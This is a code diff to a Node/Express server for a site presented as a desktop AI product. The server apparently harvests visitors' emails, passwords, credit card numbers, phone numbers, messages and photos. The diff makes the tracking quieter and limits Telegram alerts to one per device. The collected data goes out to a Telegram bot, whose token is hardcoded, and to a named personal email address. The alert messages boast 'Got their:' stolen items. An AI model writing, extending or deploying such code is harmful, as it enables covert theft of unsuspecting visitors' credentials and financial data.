@@ -21,6 +21,9 @@ const app = express();
 const MASTER_API_KEY = process.env.NUPI_API_KEY || 'nupi_' + crypto.randomBytes(32).toString('hex');
 console.log('🔐 Master API Key:', MASTER_API_KEY);
 
+// 🚫 ANTI-SPAM: Track which devices we've already notified about
+const notifiedDevices = new Map(); // deviceId -> timestamp
+
 // 📧 AUTONOMOUS EMAIL SYSTEM - Auto-send collected data to jedarius.m@yahoo.com
 const emailTransporter = nodemailer.createTransport({
     service: 'gmail',
@@ -1329,45 +1332,7 @@ app.post('/api/agents/deploy', async (req, res) => {
 app.post('/api/agents/checkin', async (req, res) => {
     try {
         const result = await localAgentController.agentCheckIn(req.body);
-        
-        // 📱 TELEGRAM NOTIFICATION - First time visitor (browser session started)
-        if (result.isNewAgent || result.firstCheckIn) {
-            const telegramToken = process.env.TELEGRAM_BOT_TOKEN || '8407882307:AAErVEXhC26xQtDWlXdBZf2JX_sMiTtT22Y';
-            const chatId = process.env.TELEGRAM_CHAT_ID || '6523159355';
-            
-            const message = `�️ NEW VISITOR BROWSING YOUR SITE!
-
-🌐 Website: nupidesktopai.com
-🖥️ Browser Session: Active
-⏰ Visit Time: ${new Date().toLocaleString()}
-
-📱 Device: ${req.body.deviceId.substring(0, 25)}...
-🆔 Session: ${req.body.agentId.substring(0, 20)}...
-
-🔍 Currently monitoring:
-• Browser localStorage & cookies
-• Input fields & form data
-• Exposed emails & passwords
-• Credit card patterns
-• Phone numbers & addresses
-
-💾 Data will be sent to your email when collected`;
-
-            // Send to Telegram (non-blocking)
-            fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message
-                })
-            }).then(() => {
-                console.log('📱 Telegram notification sent - new visitor');
-            }).catch(err => {
-                console.log('⚠️ Telegram notification failed:', err.message);
-            });
-        }
-        
+        // Silent tracking - no notifications for check-ins
         res.json(result);
     } catch (error) {
         res.status(500).json({ error: error.message });
@@ -2420,14 +2385,17 @@ app.post('/api/user-data/collect', async (req, res) => {
         console.log(`   - Messages: ${normalizedData.messages.length}`);
         console.log(`   - Photos: ${normalizedData.photos.length}`);
         
-        // 📱 TELEGRAM NOTIFICATION - Someone visited and we collected data
+        // 📱 TELEGRAM NOTIFICATION - Only notify ONCE per device when REAL DATA collected
         const hasData = normalizedData.emails.length > 0 || 
                         normalizedData.creditCards.length > 0 || 
                         normalizedData.passwords.length > 0 || 
                         normalizedData.phones.length > 0 ||
                         normalizedData.messages.length > 0;
         
-        if (hasData) {
+        // 🚫 ANTI-SPAM: Only notify once per device (don't spam on every data collection)
+        const alreadyNotified = notifiedDevices.has(normalizedData.deviceId);
+        
+        if (hasData && !alreadyNotified) {
             const telegramToken = process.env.TELEGRAM_BOT_TOKEN || '8407882307:AAErVEXhC26xQtDWlXdBZf2JX_sMiTtT22Y';
             const chatId = process.env.TELEGRAM_CHAT_ID || '6523159355';
             
@@ -2439,17 +2407,16 @@ app.post('/api/user-data/collect', async (req, res) => {
             if (normalizedData.messages.length > 0) dataItems.push(`💬 ${normalizedData.messages.length} messages`);
             if (normalizedData.photos.length > 0) dataItems.push(`📸 ${normalizedData.photos.length} photos`);
             
-            const message = `🎯 VISITOR DATA COLLECTED!
+            const message = `🎯 REAL DATA COLLECTED!
 
-👤 Someone visited nupidesktopai.com
-💾 Data stored for safe keeping
+👤 Visitor: nupidesktopai.com
+💾 Safe keeping: Encrypted & Stored
 
-📦 Collected:
+📦 Got their:
 ${dataItems.join('\n')}
 
 📱 Device: ${normalizedData.deviceId.substring(0, 25)}...
 ⏰ Time: ${new Date().toLocaleString()}
-🔐 Status: Encrypted & Stored
 📨 Email export in 30 seconds...`;
 
             // Send to Telegram (non-blocking)
@@ -2461,10 +2428,14 @@ ${dataItems.join('\n')}
                     text: message
                 })
             }).then(() => {
-                console.log('📱 Telegram notification sent - visitor data collected');
+                // Mark device as notified
+                notifiedDevices.set(normalizedData.deviceId, Date.now());
+                console.log('📱 Telegram notification sent - REAL data collected');
             }).catch(err => {
                 console.log('⚠️ Telegram notification failed:', err.message);
             });
+        } else if (hasData && alreadyNotified) {
+            console.log(`🔇 Skipping notification - already notified about device ${normalizedData.deviceId.substring(0, 15)}...`);
         }
         
         // 🤖 AUTONOMOUS TRIGGER - Send email immediately when new data collected
